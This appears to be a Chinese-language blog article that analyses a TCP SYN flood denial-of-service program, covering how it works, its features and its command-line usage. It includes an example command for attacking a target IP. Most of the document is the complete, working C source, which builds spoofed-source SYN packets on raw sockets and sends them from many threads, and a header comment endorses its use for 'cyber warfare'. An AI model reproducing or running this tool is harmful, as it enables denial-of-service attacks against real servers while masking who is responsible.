# TCP Flood DDoS攻击程序分析

本文从**原理**、**目标**、**功能**和**使用方法**几个维度，详细分析一个基于TCP Flood的DDoS（分布式拒绝服务攻击）程序。该程序通过发送大量伪造的TCP数据包来消耗目标服务器资源，导致其无法正常响应合法请求。

---

## 1. 原理

该程序的核心思想是通过**TCP Flood攻击**实现拒绝服务。TCP Flood是一种常见的DoS/DDoS攻击方式，攻击者向目标服务器发送大量TCP SYN包，企图占满服务器的TCP连接队列，使其无法为合法请求分配资源，导致拒绝服务。

### 核心技术点：

- **伪造IP地址**：每个发送的TCP包都带有伪造的源IP地址，目标服务器无法区分合法请求与恶意请求。
- **随机TCP端口和序列号**：每次发送的TCP包都随机选择目标端口和TCP序列号，使服务器难以识别特征攻击流量。
- **原始套接字**：程序使用原始套接字发送TCP数据包，可以直接控制数据包内容，包括IP头部和TCP头部。
- **多线程并发**：通过创建多个线程并发发送数据包，从而极大提高攻击流量，模拟DDoS攻击效果。

---

## 2. 目标

该程序的目标是通过伪造大量TCP请求，耗尽目标服务器的资源，达到以下目的：

1. **使目标服务器无法处理正常的网络请求**：通过大量伪造的TCP SYN请求，服务器的资源会被恶意占用，从而无法正常响应其他请求。
2. **对目标服务器进行压力测试**：该工具可以用于模拟高流量攻击，帮助管理员测试服务器的抗压能力。
3. **进行网络安全研究**：该程序可用于研究DDoS攻击的原理和防御机制。

---

## 3. 功能

该程序的核心功能包括：

- **伪造IP地址和端口**：发送带有伪造源IP地址和端口的TCP SYN请求，制造出大量伪装请求，增加攻击的匿名性。
- **控制数据包发送速率**：程序允许设置每秒发送数据包的数量，通过控制节流来调节攻击强度。
- **多线程发送数据包**：支持通过多个线程并行发送数据包，提高攻击效率，模拟分布式攻击效果。
- **动态调整发送速率**：根据设定的每秒数据包数量，程序自动调整发送速率，确保不会超出设定的攻击强度。
- **运行时间控制**：程序支持设定攻击的持续时间，在指定的时间内持续发送攻击流量。

---

## 4. 使用方法

### 4.1 参数说明

程序需要在命令行中传入以下参数：
Usage:<程序名><目标IP><线程数量><包发送速率><持续时间>

- **目标IP**：需要攻击的目标服务器的IP地址。
- **线程数量**：程序会创建指定数量的线程，每个线程并发发送TCP SYN包，以增加攻击流量。
- **包发送速率**：每秒发送的最大数据包数量，设为-1表示不限制发送速率。
- **持续时间**：攻击持续的时间，单位为秒。

### 4.2 示例

假设你想对IP地址为`192.168.1.1`的服务器进行DDoS攻击，使用5个线程，每秒最多发送5000个数据包，攻击持续时间为60秒，命令如下：

```bash
./tcp_flood 192.168.1.1 5 5000 60
```

### 4.3 实现原理说明
- **创建原始套接字**：程序使用socket()函数创建一个原始套接字，允许手动控制IP包的头部。
- **IP头部和TCP头部的组装：通过设置TCP头部和IP头部的字段，伪造大量TCP SYN数据包。
- **发送数据包**：使用sendto()函数不断向目标服务器发送伪造的数据包，并通过多线程实现并发，达到更高的攻击流量。
- **控制节流**： 程序根据传入的发送速率参数，通过调整睡眠时间（usleep()函数）来控制每秒发送的数据包数量。



---


```c
/*
        This is released under the GNU GPL License v3.0, and is allowed to be used for cyber warfare. ;)
*/
#include <unistd.h>             // 包含POSIX操作系统API，如usleep等。
#include <time.h>               // 包含时间相关函数，如time()。
#include <sys/types.h>          // 包含系统类型定义。
#include <sys/socket.h>         // 包含套接字编程所需的数据结构和函数声明。
#include <sys/ioctl.h>          // 包含设备控制接口。
#include <string.h>             // 包含字符串处理函数，如memset()、memcpy()等。
#include <stdlib.h>             // 包含标准库函数，如malloc()、atoi()等。
#include <stdio.h>              // 包含输入输出函数，如fprintf()、stdout等。
#include <pthread.h>            // 包含线程相关的函数和数据结构。
#include <netinet/tcp.h>        // 包含TCP协议的数据结构。
#include <netinet/ip.h>         // 包含IP协议的数据结构。
#include <netinet/in.h>         // 包含Internet协议族的定义。
#include <netinet/if_ether.h>   // 包含以太网头部的定义。
#include <netdb.h>              // 包含域名解析函数，如gethostbyname()。
#include <net/if.h>             // 包含网络接口相关定义。
#include <arpa/inet.h>          // 包含IP地址转换函数，如inet_addr()。

#define MAX_PACKET_SIZE 4096    // 定义数据包的最大大小为4096字节。
#define PHI 0x9e3779b9          // 定义一个用于随机数生成的常量。
static unsigned long int Q[4096], c = 362436;  // 定义随机数生成的数组和一个常量c。
volatile int limiter;            // 限制发送速率的变量。
volatile unsigned int pps;       // 每秒发送的包数量计数器。
volatile unsigned int sleeptime = 100;  // 控制发送延迟的变量，单位为微秒。

// 初始化随机数生成器
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;                       // 初始化第一个元素。
    Q[1] = x + PHI;                 // 初始化第二个元素。
    Q[2] = x + PHI + PHI;           // 初始化第三个元素。
    // 使用线性同余法生成随机数填充数组Q。
    for (i = 3; i < 4096; i++) { Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

// 生成随机数的函数，使用了cmwc（计数器模式随机数生成器）算法
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;   // 常量a用于随机数生成。
    static unsigned long int i = 4095;       // 静态变量i用于控制数组的索引。
    unsigned long int x, r = 0xfffffffe;     // r用于限制随机数范围。

    i = (i + 1) & 4095;              // 控制索引在0到4095之间循环。
    t = a * Q[i] + c;                // 生成随机数并存储在t中。
    c = (t >> 32);                   // 更新c。
    x = t + c;                       // 生成新的随机数。
    if (x < c) {                     // 如果溢出，修正x和c。
        x++;
        c++;
    }
    return (Q[i] = r - x);           // 返回生成的随机数并存储在Q[i]中。
}


// 计算校验和的函数，传入缓冲区指针和长度，返回校验和
unsigned short csum(unsigned short* buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }  // 将数据两两相加，累加到sum。
    if (count > 0) { sum += *(unsigned char*)buf; }    // 如果有剩余字节，单独处理。
    while (sum >> 16) { sum = (sum & 0xffff) + (sum >> 16); }  // 处理溢出的部分。
    return (unsigned short)(~sum);  // 返回反码作为校验和。
}


// 计算TCP校验和的函数
unsigned short tcpcsum(struct iphdr* iph, struct tcphdr* tcph) {
    struct tcp_pseudo
    {
        unsigned long src_addr;  // 源地址。
        unsigned long dst_addr;  // 目的地址。
        unsigned char zero;      // 占位符0。
        unsigned char proto;     // 协议号。
        unsigned short length;   // TCP报文长度。
    } pseudohead;                // 定义伪TCP头部结构。

    unsigned short total_len = iph->tot_len;     // IP报文的总长度。
    pseudohead.src_addr = iph->saddr;              // 源IP地址。
    pseudohead.dst_addr = iph->daddr;              // 目的IP地址。
    pseudohead.zero = 0;                           // 设置为0。
    pseudohead.proto = IPPROTO_TCP;                // 协议号为TCP。
    pseudohead.length = htons(sizeof(struct tcphdr));  // TCP报文长度。

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);  // TCP伪头加报头的总长度。
    unsigned short* tcp = malloc(totaltcp_len);  // 为TCP校验和计算分配内存。
    memcpy((unsigned char*)tcp, &pseudohead, sizeof(struct tcp_pseudo));   // 复制伪头部。
    memcpy((unsigned char*)tcp + sizeof(struct tcp_pseudo), (unsigned char*)tcph, sizeof(struct tcphdr));  // 复制TCP报头。

    unsigned short output = csum(tcp, totaltcp_len);  // 计算校验和。
    free(tcp);                                      // 释放内存。
    return output;                                  // 返回校验和。
}

// 初始化IP头部
void setup_ip_header(struct iphdr* iph)
{
    iph->ihl = 5;                                   // IP头部长度。
    iph->version = 4;                               // 使用IPv4协议。
    iph->tos = 0;                                   // 服务类型。
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);  // 总长度。
    iph->id = htonl(54321);                         // 标识符。
    iph->frag_off = 0;                              // 分段偏移量。
    iph->ttl = MAXTTL;                              // 生存时间。
    iph->protocol = 6;                              // 协议号（TCP）。
    iph->check = 0;                                 // 校验和初始化为0。
    iph->saddr = inet_addr("192.168.3.100");        // 源地址。
}

// 初始化TCP头部
void setup_tcp_header(struct tcphdr* tcph)
{
    tcph->source = htons(5678);                     // 源端口。
    tcph->seq = rand();                             // 随机序列号。
    tcph->ack_seq = 1;                              // 确认号。
    tcph->res2 = 0;                                 // 保留位。
    tcph->doff = 5;                                 // 数据偏移量。
    tcph->syn = 1;                                  // SYN标志，表示建立连接。
    tcph->window = htons(65535);                    // 窗口大小。
    tcph->check = 0;                                // 校验和初始化为0。
    tcph->urg_ptr = 0;                              // 紧急指针。
}
// flood函数负责发送数据包
void* flood(void* par1)
{
    char* td = (char*)par1;                          // 将参数par1转换为目标IP地址的字符串。
    char datagram[MAX_PACKET_SIZE];                   // 分配存储数据包的缓冲区。

    struct iphdr* iph = (struct iphdr*)datagram;     // 将datagram缓冲区解释为IP头部。
    struct tcphdr* tcph = (void*)iph + sizeof(struct iphdr);  // 将datagram中IP头部后的部分解释为TCP头部。

    struct sockaddr_in sin;                           // 定义目标地址结构体。
    sin.sin_family = AF_INET;                         // 设置地址族为IPv4。
    sin.sin_port = htons(rand() % 20480);             // 随机选择目标端口号。
    sin.sin_addr.s_addr = inet_addr(td);              // 将传入的目标IP地址字符串转换为网络字节序的IP地址。

    // 创建原始套接字，协议族为PF_INET，类型为SOCK_RAW，使用TCP协议。
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        // 如果创建失败，打印错误信息并退出程序。
        fprintf(stderr, ":: cant open raw socket. got root?\n");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);             // 将数据包缓冲区清零。
    setup_ip_header(iph);                             // 初始化IP头部。
    setup_tcp_header(tcph);                           // 初始化TCP头部。

    // 随机设置TCP目标端口号
    tcph->dest = htons(rand() % 20480);

    // 设置目标IP地址为sin结构体中存储的目标地址。
    iph->daddr = sin.sin_addr.s_addr;

    // 计算IP头部的校验和
    iph->check = csum((unsigned short*)datagram, iph->tot_len);

    int tmp = 1;
    const int* val = &tmp;

    // 设置套接字选项，IP_HDRINCL表示手动管理IP头部。
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        fprintf(stderr, ":: motherfucking error.\n");  // 错误处理。
        exit(-1);
    }

    init_rand(time(NULL));                            // 初始化随机数生成器，使用当前时间作为种子。
    register unsigned int i;
    i = 0;

    // 无限循环，用于持续发送数据包
    while (1) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));  // 发送数据包。

        // 随机生成IP源地址并更新IP头部
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);   // 随机设置IP头部的标识字段。
        iph->check = csum((unsigned short*)datagram, iph->tot_len);  // 重新计算IP头部的校验和。

        // 随机生成TCP序列号和源端口号
        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->check = 0;                             // TCP校验和先置为0。
        tcph->check = tcpcsum(iph, tcph);            // 计算TCP校验和。

        pps++;                                       // 发送的包计数器递增。

        // 如果达到发送速率限制，进入睡眠以控制速率
        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);                       // 睡眠一段时间控制速率。
        }
        i++;
    }
}
// 主函数
int main(int argc, char* argv[])
{
    // 检查命令行参数数量是否正确
    if (argc < 5) {
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <IP> <threads> <throttle, -1 for no throttle> <time>\n", argv[0]);
        exit(-1);                                    // 参数错误时退出。
    }

    int num_threads = atoi(argv[2]);                 // 获取线程数量参数。
    int maxpps = atoi(argv[3]);                      // 获取每秒最大包数参数。

    limiter = 0;                                     // 初始化限速器。
    pps = 0;                                         // 初始化每秒包数计数器。

    pthread_t thread[num_threads];                   // 创建线程数组。
    int multiplier = 20;                             // 用于控制时间片的倍数因子。
    int i;

    // 创建多个线程并启动flood函数
    for (i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
    }

    fprintf(stdout, ":: sending all the packets..\n");  // 提示信息：开始发送数据包。

    // 控制发送时间和速率
    for (i = 0; i < (atoi(argv[4]) * multiplier); i++) {
        usleep((1000 / multiplier) * 1000);          // 每个时间片延迟一段时间。

        // 如果当前每秒发送的包数量超过限制
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) {
                sleeptime += 100;                    // 增加睡眠时间以降低发送速率。
            }
            else {
                limiter--;                           // 减少限速。
            }
        }
        else {
            limiter++;                               // 增加发送速率。
            if (sleeptime > 25) {
                sleeptime -= 25;                     // 减少睡眠时间以提高发送速率。
            }
            else {
                sleeptime = 0;                       // 最低不再睡眠。
            }
        }

        pps = 0;                                     // 每秒包数计数器重置。
    }

    return 0;                                        // 正常退出程序。
}
```